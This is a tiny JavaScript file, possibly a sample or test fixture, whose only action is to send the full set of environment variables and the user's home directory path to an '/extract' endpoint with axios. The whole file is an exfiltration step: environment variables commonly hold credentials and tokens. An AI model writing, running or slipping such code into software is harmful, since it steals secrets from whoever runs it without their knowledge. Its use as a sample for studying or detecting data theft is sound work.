import axios from "axios";
import os from "os";

const post = axios.post;

await post("/extract", {data:[null,process.env ,[os.homedir()]]});
